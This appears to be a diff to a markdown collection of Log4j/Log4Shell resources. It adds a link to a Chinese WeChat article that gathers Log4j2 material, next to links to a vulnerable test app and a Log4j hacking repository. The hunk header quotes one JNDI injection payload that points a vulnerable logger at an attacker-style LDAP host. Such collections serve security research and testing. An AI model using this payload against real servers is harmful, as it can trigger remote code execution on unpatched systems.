@@ -278,3 +278,6 @@ ${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}
 [log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
 
 [HackLog4j-永恒之恶龙](https://github.com/0e0w/HackLog4j)
+
+[干货 ｜GitHUB安全搬运工之Log4j2集合](https://mp.weixin.qq.com/s?__biz=MzIzNzMxMDkxNw==&mid=2247486370&idx=1&sn=60599b835f8e14670c1b75d82ac8100d&chksm=e8cbcd08dfbc441e312735badc7f5e018251abe6461e7442c2708db32f62754800e07dafb47c&scene=178&cur_album_id=2069879703468818433#rd)
+
